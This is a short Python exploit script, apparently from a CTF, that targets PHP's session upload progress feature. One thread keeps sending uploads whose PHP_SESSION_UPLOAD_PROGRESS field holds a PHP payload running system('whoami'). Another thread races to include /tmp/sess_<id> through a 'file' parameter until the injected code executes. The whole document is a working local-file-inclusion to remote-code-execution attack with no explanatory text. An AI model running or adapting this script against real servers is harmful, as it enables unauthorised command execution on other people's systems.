# @Author:Firebasky
# coding:utf-8
import io
import sys
import requests
import threading

host = 'url'
sessid = 'Firebasky'
proxy={
    'http': '127.0.0.1:8080'
}
def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        proxy = {
            'http': '127.0.0.1:8080'
        }
        session.post(
            host,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('whoami');echo md5('1');?>"},
            files={"file":('a.txt', f)},
            cookies={'PHPSESSID':sessid},
            # proxies = proxy
        )

def READ(session):
    while True:
        response = session.get(f'{host}?file=/tmp/sess_{sessid}')
        # print(response.text)
        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)

with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()
    READ(session)
